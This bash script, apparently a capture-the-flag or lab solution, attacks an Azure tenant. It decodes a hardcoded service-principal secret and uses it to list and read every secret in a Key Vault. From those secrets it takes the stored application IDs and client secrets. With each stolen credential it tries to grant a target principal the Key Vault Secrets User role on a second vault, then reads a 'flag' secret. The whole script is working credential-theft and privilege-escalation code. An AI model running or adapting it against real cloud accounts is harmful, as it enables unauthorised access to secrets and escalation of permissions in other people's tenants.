#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
SYNC_ID=58108da8-044e-4d7e-9a46-92e6179b30be
SYNC_SEC=$(printf %s "fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==" | base64 -d)
TARGET_OID=c15570ad-5fd2-430c-97bb-a49e9a08d95c
SCOPE="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
KVSU="/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"
FLAGURL="https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
sp_tok(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$3/.default" | jq -r '.access_token'; }
PVT=$(sp_tok "$SYNC_ID" "$SYNC_SEC" "https://vault.azure.net")
IDS=$(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value[]?.id')
for sid in $IDS; do
  js=$(curl -s "${sid}?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value')
  aid=$(echo "$js" | jq -r '.appId? // empty'); asec=$(echo "$js" | jq -r '.clientSecret? // empty')
  nm=$(echo "$sid" | sed 's#.*/##')
  [ -z "$aid" ] && continue
  A=$(sp_tok "$aid" "$asec" "https://management.azure.com")
  RID=$(cat /proc/sys/kernel/random/uuid)
  body=$(jq -nc --arg r "$KVSU" --arg p "$TARGET_OID" '{properties:{roleDefinitionId:$r,principalId:$p,principalType:"ServicePrincipal"}}')
  R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "https://management.azure.com$SCOPE/providers/Microsoft.Authorization/roleAssignments/$RID?api-version=2022-04-01" -H "Authorization: Bearer $A" -H "Content-Type: application/json" -d "$body")
  echo "GRANT_BY $nm -> $R"
done
echo "sleeping for propagation"; sleep 40
echo "=== read flag with syncsec ==="
curl -s "$FLAGURL" -H "Authorization: Bearer $PVT"
echo
echo ALL_DONE
